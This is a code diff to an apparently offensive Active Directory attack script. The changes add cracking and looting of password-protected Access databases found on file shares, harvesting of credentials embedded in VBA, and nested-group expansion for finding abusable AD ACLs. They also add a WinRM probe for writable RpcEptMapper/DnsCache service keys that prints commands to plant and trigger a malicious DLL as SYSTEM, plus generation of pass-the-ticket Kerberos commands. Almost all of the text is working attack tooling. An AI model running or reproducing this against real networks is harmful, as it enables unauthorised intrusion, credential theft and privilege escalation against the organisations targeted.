@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.48.6"
+readonly VERSION="1.49.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -868,6 +868,13 @@ phase_unauth() {
             sed 's/^/        /' "$_f" 2>/dev/null | head -25 | while IFS= read -r _l; do detail "$_l"; done
         done < <(find "$adl" -type f -size -20k \( -iname '*.txt' -o -iname '*.md' -o -iname '*.csv' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.xml' -o -iname '*.html' -o -iname '*.config' \) 2>/dev/null | head -12)
         harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' ! -iname 'desktop.ini' ! -iname '*.ini' -exec cat {} + 2>/dev/null)
+        # Crack/extract password-protected docs found anonymously (e.g. a public
+        # staff.accdb whose VBA holds an LDAP bind) — same handlers as authed shares.
+        while IFS= read -r _f; do
+            case "${_f,,}" in
+                *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx|*.accdb|*.mdb) crack_file "$_f" ;;
+            esac
+        done < <(printf '%s\n' "$_af")
         # Usernames live in these files too (the foothold account is NOT known in
         # advance -- it's whoever the spray flags). Mine candidate usernames from the
         # content (emails + first.last) so they get merged into users_all.txt and
@@ -2002,7 +2009,7 @@ try:
                 except Exception: pass
 except Exception: sys.exit(0)
 def short(s): return str(s or "").split("@")[0]
-objs=[]; owner_sid=None
+objs=[]; owner_sid=None; groups=[]   # groups: (group_sid, [member_sids])
 for fn,doc in data.items():
     low=fn.lower()
     typ=("User" if "users" in low else "Group" if "groups" in low else
@@ -2012,8 +2019,20 @@ for fn,doc in data.items():
         props=o.get("Properties") or {}
         sam=short(props.get("samaccountname") or props.get("name") or oid)
         objs.append((sam,typ,o.get("Aces") or []))
+        if typ=="Group":
+            groups.append((oid,[m.get("ObjectIdentifier","") for m in (o.get("Members") or [])]))
         if owner in (sam.lower(), short(props.get("name","")).lower()): owner_sid=oid
 if not owner_sid: sys.exit(0)
+# Effective SIDs the owner holds = self + EVERY group it's a (transitive, nested)
+# member of + well-known Authenticated Users / Everyone. Without this we'd miss ACLs
+# delegated to a GROUP the user belongs to (a real, common privesc edge).
+mysids={owner_sid, "S-1-5-11", "S-1-1-0"}
+changed=True
+while changed:
+    changed=False
+    for gid,mems in groups:
+        if gid and gid not in mysids and any(m in mysids for m in mems):
+            mysids.add(gid); changed=True
 ABUSABLE={"GenericAll","GenericWrite","WriteDacl","WriteOwner","Owns","AddMember","AddSelf",
           "ForceChangePassword","AllExtendedRights","AddKeyCredentialLink","WriteSPN","AddAllowedToAct",
           "ReadGMSAPassword","ReadLAPSPassword"}
@@ -2021,7 +2040,7 @@ seen=set()
 for sam,typ,aces in objs:
     for a in aces:
         r=a.get("RightName")
-        if a.get("PrincipalSID","")==owner_sid and r in ABUSABLE:
+        if a.get("PrincipalSID","") in mysids and r in ABUSABLE:
             k=(r,sam,typ)
             if k in seen: continue
             seen.add(k); print("%s\t%s\t%s"%(r,sam,typ))
@@ -3230,6 +3249,25 @@ analyze_privileges() {
     fi
     [[ "$priv_ok" == "1" && "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
     [[ "$priv_ok" == "0" && "$grp_ok" == "1" ]] && info "Read groups but not privileges over WinRM (whoami /priv exec failed) — see whoami_priv_${USER}.txt"
+
+    # Weak service-registry-key privesc → SYSTEM (RpcEptMapper / DnsCache "Performance"
+    # DLL hijack). On some Windows builds a non-admin can write the service key; adding
+    # a Performance\Library value makes the WMI perf collector load that DLL as SYSTEM.
+    # Only meaningful once we have command exec on the host, so probe the ACL via WinRM.
+    if [[ "$priv_ok" == "1" || "$CAP_WINRM" == "1" ]]; then
+        local rps ro
+        rps='$ErrorActionPreference="SilentlyContinue";foreach($s in "RpcEptMapper","DnsCache"){$k="HKLM:\SYSTEM\CurrentControlSet\Services\$s";(Get-Acl $k).Access|?{$_.AccessControlType -eq "Allow" -and $_.RegistryRights -match "SetValue|CreateSubKey|WriteKey|FullControl" -and $_.IdentityReference -match "Authenticated Users|Everyone|\\Users$|INTERACTIVE"}|%{"WEAKKEY "+$s+" "+$_.IdentityReference+" "+$_.RegistryRights}}'
+        ro=$($NXC winrm "$DCT" "${args[@]}" -x "powershell -nop -ep bypass -c \"$rps\"" 2>/dev/null)
+        if grep -qi 'WEAKKEY' <<<"$ro"; then
+            grep -i 'WEAKKEY' <<<"$ro" | sed 's/^.*WEAKKEY /WEAKKEY /' | sort -u | while read -r l; do
+                loot "★ Writable service key → privesc: ${C_BOLD}${l#WEAKKEY }${C_RESET}"; done
+            loot "  → ${C_BOLD}RpcEptMapper/DnsCache Performance-DLL → SYSTEM${C_RESET} (build a perf DLL exporting Open/Collect/Close):"
+            detail "      reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper\\Performance' /v Library /t REG_SZ /d 'C:\\Windows\\Temp\\evil.dll' /f"
+            detail "      reg add '...\\RpcEptMapper\\Performance' /v Open /t REG_SZ /d OpenPerfData /f; ...Collect/Close too"
+            detail "      # trigger as SYSTEM:  \$c=New-Object Diagnostics.PerformanceCounterCategory('RpcEptMapper'); \$c.ReadCategory()   (or any WMI Win32_PerfFormattedData query)"
+            echo "$ro" >"$OUTDIR/weak_service_keys_$(_safe_name "$USER").txt"
+        fi
+    fi
 }
 
 phase_winrm_dpapi() {
@@ -4594,6 +4632,86 @@ run_cleanup() {
 #  SHARE LOOTING  —  spider readable shares, pull & process interesting files
 # ===========================================================================
 # Extract a crackable hash from a password-protected file and crack it.
+# --- Access (.accdb/.mdb) looting ------------------------------------------
+# Encrypted .accdb uses Access' own ACE encryption (NOT the OLE container), so
+# msoffcrypto/mdbtools can't open it. Jackcess (Java) + CryptCodecProvider can —
+# we fetch the jars once and embed a tiny page-dump decryptor that writes a plain
+# copy, then read tables (mdb-tools) + harvest the VBA-embedded creds (LDAP binds,
+# DB connection strings) which live as plaintext literals in the file body.
+ACCDB_JARDIR="${ADAUTOPWN_JACKCESS:-$HOME/.config/adautopwn/jackcess}"
+_accdb_ensure_jackcess() {
+    [[ -f "$ACCDB_JARDIR/AccdbDecrypt.class" ]] && return 0
+    have java && have javac || { warn "  java/javac not installed → cannot decrypt .accdb (apt install default-jdk)"; return 1; }
+    mkdir -p "$ACCDB_JARDIR" || return 1
+    local b="https://repo1.maven.org/maven2" url out
+    while read -r url out; do
+        [[ -z "$url" || -f "$ACCDB_JARDIR/$out" ]] && continue
+        curl -fsSL -o "$ACCDB_JARDIR/$out" "$b/$url" || { warn "  could not fetch jackcess dep $out"; return 1; }
+    done <<'JARS'
+com/healthmarketscience/jackcess/jackcess/3.0.1/jackcess-3.0.1.jar jackcess.jar
+com/healthmarketscience/jackcess/jackcess-encrypt/3.0.0/jackcess-encrypt-3.0.0.jar jackcess-encrypt.jar
+org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar commons-lang3.jar
+commons-logging/commons-logging/1.2/commons-logging-1.2.jar commons-logging.jar
+org/bouncycastle/bcprov-jdk18on/1.78.1/bcprov-jdk18on-1.78.1.jar bcprov.jar
+javax/xml/bind/jaxb-api/2.3.1/jaxb-api-2.3.1.jar jaxb-api.jar
+com/sun/xml/bind/jaxb-impl/2.3.1/jaxb-impl-2.3.1.jar jaxb-impl.jar
+javax/activation/activation/1.1.1/activation-1.1.1.jar activation.jar
+com/sun/istack/istack-commons-runtime/3.0.8/istack-commons-runtime-3.0.8.jar istack.jar
+JARS
+    cat > "$ACCDB_JARDIR/AccdbDecrypt.java" <<'JAVA'
+import com.healthmarketscience.jackcess.*;
+import com.healthmarketscience.jackcess.impl.*;
+import java.io.*; import java.nio.*;
+public class AccdbDecrypt {
+  public static void main(String[] a) throws Exception {
+    File f=new File(a[0]);
+    DatabaseImpl db=(DatabaseImpl)new DatabaseBuilder(f)
+        .setCodecProvider(new CryptCodecProvider(a[1])).setReadOnly(true).open();
+    PageChannel pc=db.getPageChannel(); int ps=db.getFormat().PAGE_SIZE;
+    int pages=(int)(f.length()/ps);
+    try(FileOutputStream out=new FileOutputStream(a[2])){
+      for(int i=0;i<pages;i++){ByteBuffer buf=pc.createPageBuffer();pc.readPage(buf,i);
+        byte[] b=new byte[ps];buf.position(0);buf.get(b,0,Math.min(ps,buf.limit()));out.write(b);}}
+    db.close();
+  }
+}
+JAVA
+    local CP; CP=$(printf '%s:' "$ACCDB_JARDIR"/*.jar)
+    javac -cp "$CP" "$ACCDB_JARDIR/AccdbDecrypt.java" >>"$LOGFILE" 2>&1 \
+        || { warn "  jackcess decryptor failed to compile"; return 1; }
+    return 0
+}
+# Loot an Access DB (decrypt with $2 if given) → tables + VBA creds into the engine.
+_accdb_loot() {
+    local f="$1" pw="$2" base dec; base="$(basename "$f")"
+    if [[ -n "$pw" ]]; then
+        _accdb_ensure_jackcess || { warn "  '$base' password = ${C_GREEN}${C_BOLD}${pw}${C_RESET} but auto-decrypt unavailable — open it manually (Access/jackcess)"; return 1; }
+        dec="$OUTDIR/decrypted_${base}"
+        local CP; CP=$(printf '%s:' "$ACCDB_JARDIR"/*.jar)
+        if java -cp "${CP}${ACCDB_JARDIR}" AccdbDecrypt "$f" "$pw" "$dec" >>"$LOGFILE" 2>&1 && [[ -s "$dec" ]]; then
+            ok "  Decrypted ${base} → decrypted_${base}"
+        else
+            warn "  jackcess could not decrypt ${base}"; return 1
+        fi
+    else
+        dec="$f"     # unencrypted DB → read in place
+    fi
+    subsection "Access DB loot → ${base} (tables + embedded VBA)"
+    local outf="$OUTDIR/accessdb_$(_safe_name "$base").txt"; : >"$outf"
+    if have mdb-tables; then
+        local t
+        while IFS= read -r t; do [[ -z "$t" ]] && continue
+            { echo "### TABLE: $t"; mdb-export "$dec" "$t" 2>/dev/null; } >>"$outf"
+        done < <(mdb-tables -1 "$dec" 2>/dev/null)
+    fi
+    # VBA modules / LDAP binds keep their creds as plaintext literals in the body
+    local txt; txt=$(strings -n 4 "$dec" 2>/dev/null)
+    printf '%s\n' "$txt" | grep -iE 'LDAP://|DC=|password|pwd|[A-Za-z0-9.-]+\\[A-Za-z0-9._-]+' \
+        | grep -ivE '^<|schemas\.microsoft|keyEncryptor' | sort -u >>"$outf"
+    [[ -s "$outf" ]] && { loot "  Access DB content (tables + VBA strings) → $(basename "$outf")"; grep -vE '^### |^[[:space:]]*$' "$outf" | head -25; }
+    harvest_secrets <<<"$txt" "accdb:${base}"
+}
+
 crack_file() {
     local f="$1" base ext tool
     base="$(basename "$f")"; ext="${base##*.}"; ext="${ext,,}"
@@ -4601,7 +4719,7 @@ crack_file() {
     # (the recovered password is already in FOUND_SECRETS). Saves re-running john.
     [[ -n "${CRACKED_DOCS[$base]:-}" ]] && return
     case "$ext" in
-        xls|xlsx|xlsm|doc|docx|ppt|pptx) tool=office2john ;;
+        xls|xlsx|xlsm|doc|docx|ppt|pptx|accdb|mdb) tool=office2john ;;
         pdf)  tool=pdf2john ;;
         zip)  tool=zip2john ;;
         rar)  tool=rar2john ;;
@@ -4612,7 +4730,12 @@ crack_file() {
     have "$tool" || { warn "$tool not installed — cannot process $base"; return; }
     local hashf="$OUTDIR/filehash_${base}.txt"
     "$tool" "$f" 2>/dev/null >"$hashf"
-    [[ ! -s "$hashf" ]] && { rm -f "$hashf"; return; }
+    if [[ ! -s "$hashf" ]]; then
+        rm -f "$hashf"
+        # No extractable hash from an Access DB → it's unencrypted: read it directly.
+        [[ "$ext" == accdb || "$ext" == mdb ]] && { CRACKED_DOCS["$base"]=1; _accdb_loot "$f" ""; }
+        return
+    fi
     CRACKED_DOCS["$base"]=1     # mark attempted now → future passes skip it
     loot "Crackable hash extracted from ${C_BOLD}${base}${C_RESET} → cracking with john…"
     run "john --wordlist=$WORDLIST $hashf"
@@ -4624,7 +4747,8 @@ crack_file() {
         loot "★ File password cracked → ${base} : ${C_GREEN}${C_BOLD}${pw}${C_RESET}"
         echo "${base}:${pw}" >>"$OUTDIR/cracked_files.txt"
         add_secret "$pw" "doc password: $base"
-        decrypt_and_read "$f" "$pw" "$ext"
+        if [[ "$ext" == accdb || "$ext" == mdb ]]; then _accdb_loot "$f" "$pw"
+        else decrypt_and_read "$f" "$pw" "$ext"; fi
     else
         info "Could not crack ${base} with this wordlist"
     fi
@@ -5097,7 +5221,7 @@ phase_share_loot() {
     subsection "Cracking password-protected documents found on shares"
     while IFS= read -r f; do
         case "${f,,}" in
-            *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx) crack_file "$f" ;;
+            *.xls|*.xlsx|*.xlsm|*.doc|*.docx|*.ppt|*.pptx|*.pdf|*.zip|*.rar|*.7z|*.kdbx|*.accdb|*.mdb) crack_file "$f" ;;
             *id_rsa|*.ppk|*.pem|*.key) loot "Private/SSH key found: $f"; echo "$f" >>"$OUTDIR/ssh_keys.txt" ;;
         esac
     done <<<"$files"
@@ -6241,6 +6365,30 @@ ABUSE = {
 # resolve string aliases
 for k,v in list(ABUSE.items()):
     if isinstance(v,str): ABUSE[k]=ABUSE.get(v,[])
+
+# Kerberos siblings — when you hold a TGT/hash but NOT the cleartext password, every
+# `-p '<pass>'` command has a `-k` equivalent. Auto-generate them so the graph always
+# shows a no-password path (export KRB5CCNAME=<ticket.ccache> first; or PtH with -H).
+import re as _re
+def _kerberize(cmd):
+    c = cmd
+    # impacket "dom/user:pass@host" → keep @host, drop :pass, add -k -no-pass flag
+    if _re.search(r"\{dom\}/'[^']+':'<pass>'@", c):
+        c = _re.sub(r"(\{dom\}/'[^']+'):'<pass>'(@\S+)", r"\1\2", c).rstrip() + " -k -no-pass"
+    c = c.replace(":'<pass>'", " -k -no-pass")   # impacket dom/user:pass (no @host)
+    c = c.replace("%'<pass>'", " -k")            # net rpc -U dom/user%pass
+    c = c.replace("-p '<pass>'", "-k -no-pass")  # bloodyAD/certipy/nxc -p
+    if c == cmd:
+        return None
+    return c if c.startswith("KRB5CCNAME=") else "KRB5CCNAME=<ticket.ccache> " + c
+for k,v in list(ABUSE.items()):
+    extra=[]
+    for e in v:
+        if e.get("os")=="linux" and "<pass>" in e.get("cmd",""):
+            kc=_kerberize(e["cmd"])
+            if kc: extra.append({"os":"linux","when":e.get("when","any"),
+                                 "tool":e["tool"]+" · Kerberos (no pass)","cmd":kc})
+    v.extend(extra)
 
 def write_html(payload, meta):
     tpl = HTML_TEMPLATE
